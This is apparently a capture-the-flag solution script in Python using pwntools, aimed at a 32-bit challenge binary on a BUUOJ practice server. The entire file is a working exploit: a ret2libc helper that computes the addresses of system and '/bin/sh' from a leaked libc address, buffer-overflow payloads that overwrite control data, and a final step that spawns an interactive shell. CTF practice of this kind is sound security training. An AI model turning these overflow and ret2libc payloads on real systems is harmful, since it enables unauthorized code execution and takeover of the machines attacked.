from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='i386', os='linux', log_level = 'DEBUG')
binary = './pwn'
elf = ELF(binary)
p = remote('node3.buuoj.cn',29075) if argv[1]=='r' else process(binary)

# start
sl('8584')
sl('[1, 1, 3, 5, 11, 21]')
sl('\x00')
sl('3 0 3 0 3 0 0')

payload = flat('a'*4,elf.sym['__nr'])
sl(payload)
payload = flat('a'*4,elf.sym['system']) + '\n\n'
sl(payload)
payload = flat('a'*0xfc,0x804b070)
sl(payload)
sl('/bin/sh\x00')
# end

itr()